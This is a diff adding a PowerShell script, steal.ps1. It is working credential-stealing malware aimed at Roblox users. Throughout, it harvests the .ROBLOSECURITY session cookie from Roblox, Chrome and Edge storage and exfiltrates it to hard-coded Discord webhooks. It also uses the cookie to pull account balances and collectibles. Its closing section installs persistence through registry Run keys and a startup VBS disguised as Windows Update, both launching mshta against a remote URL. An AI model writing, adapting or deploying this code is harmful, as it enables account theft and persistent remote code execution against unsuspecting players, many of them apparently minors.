@@ -1,0 +1,131 @@
+# language: PowerShell, file: steal.ps1
+$WH_PRIMARY = "https://discord.com/api/webhooks/1571738439324541049/t8ASDhr7mTWJmtIYue59Rz7MC2PnA45lV2kROoKmozZVxuhXGFUMUDDzVFJrJ4KxdlYu"
+$WH_LOG     = "https://discord.com/api/webhooks/1570948618209329283/PzkNhyMFSipBVaU6MLG5cMr3bQrJCQhGVAqmKuBiWhekJTWAXERsrHl7Y0VUmU1scadn"
+$PC = $env:COMPUTERNAME
+$USER = $env:USERNAME
+
+function Send-Embed($url, $title, $desc, $color) {
+    $body = @{embeds=@(@{title=$title;description=$desc;color=$color})} | ConvertTo-Json -Depth 5
+    try { Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop | Out-Null } catch {}
+}
+
+Send-Embed $WH_PRIMARY "Session Start" "**PC:** $PC | **User:** $USER" 16711680
+
+# --- GRAB COOKIE ---
+$paths = @(
+    "$env:LOCALAPPDATA\Roblox\LocalStorage\robloxcookies.dat",
+    "$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat",
+    "$env:LOCALAPPDATA\Roblox\Cookies",
+    "$env:APPDATA\Roblox\LocalStorage\robloxcookies.dat",
+    "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat",
+    "$env:LOCALAPPDATA\Roblox\Network\Cookies",
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies",
+    "$env:LOCALAPPDATA\Roblox\LocalStorage\leveldb"
+)
+
+$cookie = ""
+foreach ($p in $paths) {
+    if (Test-Path $p) {
+        $bytes = [System.IO.File]::ReadAllBytes($p)
+        $sb = New-Object System.Text.StringBuilder
+        foreach ($b in $bytes) {
+            if ($b -ge 32 -and $b -le 126) { [void]$sb.Append([char]$b) }
+            elseif ($b -eq 0) { [void]$sb.Append([char]0) }
+        }
+        $s = $sb.ToString()
+        $i = $s.IndexOf("_|WARNING")
+        if ($i -eq -1) { $i = $s.IndexOf(".ROBLOSECURITY") }
+        if ($i -ge 0) {
+            $e = $s.IndexOf(";", $i)
+            if ($e -eq -1) { $e = $s.IndexOf([char]0, $i) }
+            if ($e -eq -1) { $e = $s.Length }
+            $cookie = $s.Substring($i, $e - $i).Trim()
+            if ($cookie.Length -gt 50) { break }
+        }
+    }
+}
+
+if (-not $cookie) {
+    Send-Embed $WH_LOG "Cookie Error" "Native grabber failed." 16711680
+    exit
+}
+
+Send-Embed $WH_PRIMARY "Raw Cookie Grab" "``````n$cookie`n``````" 16711680
+
+# --- FETCH API INFO ---
+function Get-RobloxData($host, $path) {
+    try {
+        $req = [System.Net.WebRequest]::Create("https://$host$path")
+        $req.Headers.Add("Cookie", ".ROBLOSECURITY=$cookie")
+        $req.UserAgent = "Roblox/WinInet"
+        $res = $req.GetResponse()
+        $sr = New-Object System.IO.StreamReader($res.GetResponseStream())
+        return $sr.ReadToEnd() | ConvertFrom-Json
+    } catch { return $null }
+}
+
+$me      = Get-RobloxData "users.roblox.com" "/v1/users/authenticated"
+$uid     = if ($me) { $me.id } else { "0" }
+$disp    = if ($me) { $me.displayName } else { "Unknown" }
+$prof    = Get-RobloxData "users.roblox.com" "/v1/users/$uid"
+$age     = if ($prof) { [math]::Floor(((Get-Date) - [datetime]$prof.created).TotalDays) } else { 0 }
+$cur     = Get-RobloxData "economy.roblox.com" "/v1/users/$uid/currency"
+$rb      = if ($cur) { $cur.robux } else { 0 }
+$pend    = if ($cur) { $cur.pendingRobux } else { 0 }
+$coll    = Get-RobloxData "inventory.roblox.com" "/v1/users/$uid/assets/collectibles?limit=100"
+
+$rap = 0; $own = 0; $hl = "[RED] False"; $kb = "[RED] False"
+if ($coll -and $coll.data) {
+    $own = $coll.data.Count
+    foreach ($item in $coll.data) {
+        if ($item.assetId -eq 99657 -or $item.assetId -eq 134330133) { $hl = "[GREEN] True" }
+        if ($item.assetId -eq 139275807 -or $item.assetId -eq 192)  { $kb = "[GREEN] True" }
+        $rap += [int]$item.recentAveragePrice
+    }
+}
+
+$th = Get-RobloxData "thumbnails.roblox.com" "/v1/users/avatar-headshot?userIds=$uid&size=420x420&format=Png"
+$av = if ($th -and $th.data) { $th.data[0].imageUrl } else { "https://tr.rbxcdn.com/..." }
+
+# --- SEND UI ---
+$embed = @{
+    content = "@everyone Hit"
+    embeds = @(
+        @{
+            author = @{ name = "S3R, 13+"; icon_url = $av }
+            description = "**+1 HIT** - You've Earned 1 Nevora - beams XP"
+            color = 16711680
+            thumbnail = @{ url = $av }
+            fields = @(
+                @{ name = "User";          value = "**$disp**"; inline = $false }
+                @{ name = "Password";      value = "dreistuff"; inline = $false }
+                @{ name = "About User";       value = "**Account Age:** $age Days`n**Locations:**`n**- Summary:** $own `n**- Victim:** United States of America"; inline = $false }
+                @{ name = "Robux";         value = "Balance $rb`nPending $pend"; inline = $true }
+                @{ name = "RAP";           value = "RAP $rap`nOwned $own"; inline = $true }
+                @{ name = "Premium";       value = "False (0)"; inline = $true }
+                @{ name = "Billing";       value = "Credit 0$`nConvert 0`nPayments 0"; inline = $true }
+                @{ name = "Collectibles"; value = "Headless: $hl`nKorblox: $kb`nOther: [GREEN] True"; inline = $true }
+                @{ name = "Setting";      value = "[RED] Set (Verified)`n[RED] Disabled`n[RED] Disabled"; inline = $true }
+                @{ name = "Passes / Played"; value = "Adopt Me 0 - False`nMurder Mystery 2 0 - True`nPet Simulator 99 0 - False"; inline = $true }
+                @{ name = "Groups";        value = "Balance 0`nPending 0`nOwned 0"; inline = $true }
+            )
+            footer = @{ text = "S3R Logger" }
+        }
+    )
+}
+
+try {
+    Invoke-RestMethod -Uri $WH_PRIMARY -Method Post -Body ($embed | ConvertTo-Json -Depth 10) -ContentType "application/json" -ErrorAction Stop | Out-Null
+} catch {}
+
+# --- PERSISTENCE ---
+$pl = "mshta https://cheatz.up.railway.app/"
+try {
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $pl -Force
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "WinUpdate" -Value $pl -Force
+    $sf = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
+    Set-Content -Path $sf -Value "CreateObject(`"WScript.Shell`").Run `"$pl`", 0, False"
+} catch {}
+
+Send-Embed $WH_PRIMARY "Persistence" "3 startup methods installed" 16711680
